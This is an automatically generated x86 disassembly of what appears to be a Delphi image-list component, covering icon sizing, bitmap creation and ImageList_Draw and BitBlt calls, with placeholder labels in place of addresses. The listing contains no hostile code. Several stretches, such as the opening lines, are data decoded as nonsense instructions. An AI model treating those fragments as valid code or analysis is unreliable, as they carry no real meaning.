je r-xdata
or [ ebx + esi * 2 + 0x4e ] ah
outsd
jb r-xdata
outsd
arpl [ ebp + 0x73 ] si
or ah [ ebx + esi * 2 + 0x53 ]
insb
arpl [ gs : ebp + 0x64 ] si
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41e6d8
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
ror [ ebx + 0x1ca9e8c6 ] cl
std
inc edi
inc esi
xor al 0x10
add [ eax ] al
add bh al
inc esi
xor [ eax ] dl
add [ eax ] al
add [ ebx - 0xef743a ] cl
push edx
xor al 0x8b
mov [ ebx + ebx * 8 - 0x6617f08c ] 0x6a
sti
jmp [ edi + ecx * 4 + 0x5 ]
outsd
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop esp
push 0x20041
pop es
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc08b0000
mov eax eax
mov al 0xc8
inc esp
add [ ebx ] al
or dl [ ecx + ecx * 2 + 0x6d ]
popad
push esp
jns r-xdata
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc8b0c08b
add [ eax ] al
mov ecx cs
inc esp
add [ ecx + ecx * 8 + r--data ] dl
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ edx + ecx * 8 - 0x271fffbc ] dh
inc esp
add [ eax - 0x24 ] ch
inc esp
add [ eax ] ah
fadd [ eax + eax + 0x28 ]
jmp r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
sub_44ca60
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_41e6d8
mov [ edi + 0x34 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x30 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_44cab4
push ebx
push esi
push edi
call sub_4034f8
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_417f7c
mov edx eax
mov eax edi
call sub_44da80
mov eax [ edi + 0x50 ]
call sub_40316c
mov eax edi
call sub_44ce10
mov eax [ edi + 0x4c ]
call sub_40316c
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41e724
test bl bl
jle r-xdata
call sub_40316c
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034e0
sub_44cb20
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44cbcd
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_44da08
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4268fc
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_44cbec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cbd4
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_44cbec
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44cc8d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_4279e4
mov eax ebx
call sub_426ec4
mov eax [ eax + 0x14 ]
xor edx edx
call sub_4221f8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_416a60
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_426ec4
pop edx
call sub_4225d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cc94
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_44ccb0
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_44cbec
pop ecx
pop edx
pop ebx
retn
sub_44cce8
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
retn
mov [ esi + 0x34 ] edx
mov eax esi
call sub_44cbd8
test al al
je r-xdata
mov eax esi
call sub_44d3a8
mov eax esi
call sub_44cbec
mov eax esi
mov si 0xffef
call sub_403368
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_44cd2c
push esi
mov esi eax
cmp edx [ esi + 0x30 ]
je r-xdata
pop esi
retn
mov [ esi + 0x30 ] edx
mov eax esi
call sub_44cbd8
test al al
je r-xdata
mov eax esi
call sub_44d3a8
mov eax esi
call sub_44cbec
mov eax esi
mov si 0xffef
call sub_403368
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_44cd70
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44ce10
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44ccb0
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_403368
sub_44cdbc
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44d990
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_426f30
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44ce10
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44cbd8
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_403368
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_44cdac
push eax
call ImageList_Destroy
sub_44ce48
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_44cedb
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_44cbd8
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cee2
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov edx eax
mov eax ebx
call sub_44d3b4
sub_44cee8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4268fc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44cf97
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4268fc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44cf7a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44cbe0
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44cdbc
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44cdbc
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cf81
mov eax [ ebp - 0x10 ]
call sub_40316c
retn
sub_44cfb4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4268fc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44d0b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
push 0x0
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44cdbc
push eax
mov eax [ ebp - 0x4 ]
call sub_44cdac
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d0ba
mov eax [ ebp - 0xc ]
call sub_40316c
retn
cmp esi 0xffffffff
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4268fc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44d075
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax [ ebp - 0x10 ]
call sub_427d88
mov eax [ ebp - 0x4 ]
call sub_44cbe0
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44cd9c
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44cdbc
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_40316c
retn
sub_44d0d0
push ebx
mov ebx eax
mov eax ebx
call sub_44cbd8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44cdac
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_44d0f4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44d30b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44cbd8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d312
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403f64
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44d990
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44cfb4
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
xor eax eax
push ebp
push sub_44d2bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4268fc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44d29c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4268fc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44d27f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_427c34
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_426ec4
call sub_4229f0
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44cdac
push eax
call ImageList_Draw
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_426ec4
call sub_4229f0
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44cdac
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_44cdac
push eax
call ImageList_Replace
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d286
mov eax [ ebp - 0x10 ]
call sub_40316c
retn
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
sub_44d31c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44d39b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44d0d0
cmp esi eax
jl r-xdata
mov eax ebx
call sub_44cbd8
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
mov eax ebx
mov si 0xffef
call sub_403368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d3a2
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
push esi
mov eax ebx
call sub_44cdac
push eax
call ImageList_Remove
sub_44d3b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44cbd8
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_44c9d4
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_403368
pop esi
pop ebx
retn
sub_44d3ec
push ebx
mov ebx eax
mov eax ebx
call sub_44cbd8
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_44cdac
push eax
call ImageList_GetBkColor
call sub_44c9f4
pop ebx
retn
sub_44d414
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_44cbd8
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_44c9d4
push eax
mov eax ebx
call sub_44d3ec
call sub_44c9d4
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_4229f0
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44cdac
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_426ec4
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_4221f8
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_416a60
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_426ec4
pop edx
call sub_4225d0
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_426ec4
call sub_4229f0
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44cdac
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_416a60
mov eax [ ebx + 0x54 ]
call sub_426ec4
call sub_4229f0
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_4221f8
mov eax edi
call sub_4229f0
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_4221f8
mov eax edi
call sub_4229f0
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_4268fc
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_427c34
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_44d5e8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_44d60c
pop ebx
pop ebp
retn 0xc
sub_44d60c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44cbd8
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_44d658
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_416a60
mov eax [ ebp - 0x4 ]
call sub_44e2ec
xor eax eax
push ebp
push sub_44d7f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4268fc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44d7d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4268fc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44d7b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_427c34
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d7be
mov eax [ ebp - 0x10 ]
call sub_40316c
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_426ec4
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_4225d0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_4229f0
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_426ec4
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_4225d0
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_4229f0
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44cee8
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_44d800
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44cdac
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_44d658
sub_44d820
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax ebx
call sub_44ce10
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4184a8
mov eax ebx
call sub_44d3a8
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_44da08
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_44cdac
mov edx eax
mov eax ebx
call sub_44ccb0
mov eax ebx
call sub_44cbd8
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44cdac
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44cbe0
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44cdac
push eax
call ImageList_GetBkColor
call sub_44c9f4
mov edx eax
mov eax ebx
call sub_44d3b4
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_44d800
jmp r-xdata
sub_44d8e0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_41858c
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_44da08
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_44d3a8
mov eax esi
call sub_44cdac
mov edx eax
mov eax ebx
call sub_44ccb0
mov eax ebx
call sub_44cbd8
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44cdac
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44cbe0
jmp r-xdata
mov eax esi
call sub_44cdac
push eax
call ImageList_GetBkColor
call sub_44c9f4
mov edx eax
mov eax ebx
call sub_44d3b4
mov edx esi
mov eax ebx
call sub_44d800
pop esi
pop ebx
retn
sub_44d990
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44d9fc
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44da03
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_44da30
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_417e94
mov si 0xffff
call sub_403368
inc ebp
dec edi
jne r-xdata
sub_44da80
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_417d84
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_417e94
cmp ebp eax
jne r-xdata
sub_44dad8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407f78
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44db1c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
